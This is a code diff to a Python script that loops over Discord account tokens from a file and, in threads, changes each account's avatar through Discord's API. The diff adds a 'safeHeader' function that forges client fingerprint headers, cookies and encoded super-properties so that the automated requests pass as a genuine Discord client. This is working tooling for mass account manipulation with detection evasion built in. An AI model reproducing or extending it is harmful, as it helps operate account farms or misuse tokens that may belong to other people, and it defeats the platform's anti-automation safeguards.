@@ -10,6 +10,27 @@ listdir = os.listdir('avatar')
 image = 'avatar/' + random.choice(listdir)
 png_uri = DataURI.from_file(image)
 
+def safeHeader(token):
+    return {
+        "authority": "discord.com",
+        "method": "POST",
+        "scheme": "https",
+        "accept": "/",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "en-US",
+        "Authorization": token,
+        "content-length": "0",
+        "cookie": f"cfuid={randstr(43)}; dcfduid={randstr(32)}; locale=en-US",
+        "origin": "https://discord.com/",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
+        "x-debug-options": "bugReporterEnabled",
+        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
+    }
+
 async def change(token):
     #avatar에 사진 여러장 넣고 랜덤으로 뽑을거면 위에 listdir~png_uri여기로 옮기셈
     
@@ -23,17 +44,17 @@ async def change(token):
     # data = {'status': "online", 'custom_status': 
     # {'text': "외주 받습니다"}} #상메, 상태설정
     try:
-        result = requests.patch('https://discord.com/api/v9/users/@me', json=jsondata, headers={'Authorization': token}).json()
+        result = requests.patch('https://discord.com/api/v9/users/@me', json=jsondata, headers=safeHeader(token)).json()
         # requests.patch('https://discord.com/api/v9/users/@me/settings', json=data, headers={'Authorization': token}).json()
         if ('avatar' in result):
-            print(f'{token} | avatar changed')
+            print(f'{token} | changed avatar')
         elif ('Rate' in result):
-            print('Rate limited. I will sleeping during 5 second')
+            print('Rate limited.')
             time.sleep(5)
         else:
-            print(f'{token} | avatar not changed')
+            print(f'{token} | not changed avatar')
     except:
-        print('Rate limited. I will sleeping during 5 second')
+        print('Rate limited.')
         time.sleep(5)
 
 f = open('tokens.txt', 'r')
@@ -46,3 +67,4 @@ for token in tokens:
     
     threading.Thread(target=temp_run, args=()).start()
 
+    
